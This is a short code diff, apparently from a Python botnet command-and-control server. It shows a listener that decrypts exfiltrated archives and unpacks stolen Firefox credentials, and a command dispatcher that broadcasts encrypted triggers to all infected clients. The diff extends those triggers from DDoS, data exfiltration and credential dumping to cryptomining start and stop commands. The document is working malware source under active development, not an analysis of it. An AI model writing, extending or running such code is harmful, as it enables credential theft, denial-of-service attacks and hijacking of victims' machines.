@@ -79,7 +79,6 @@ def exfil_listener():
                 f.write(plaintext)
             print(f"[EXFIL] ✅ Decrypted archive saved: {out_file}")
 
-            # 📦 Attempt to extract and parse Firefox credentials
             extracted_dir = out_file + "_unzipped"
             with zipfile.ZipFile(out_file, 'r') as zip_ref:
                 zip_ref.extractall(extracted_dir)
@@ -110,7 +109,10 @@ def send_command():
                 clients[index].send(encrypt_message(" ".join(command)))
             except:
                 print("[!] Invalid target index.")
-        elif cmd.startswith("trigger_ddos") or cmd.startswith("trigger_exfil") or cmd.startswith("trigger_dumpcreds"):
+        elif any(cmd.startswith(trigger) for trigger in [
+            "trigger_ddos", "trigger_exfil", "trigger_dumpcreds",
+            "trigger_mine", "trigger_stopmine"
+        ]):
             for conn in clients:
                 try:
                     conn.send(encrypt_message(cmd))
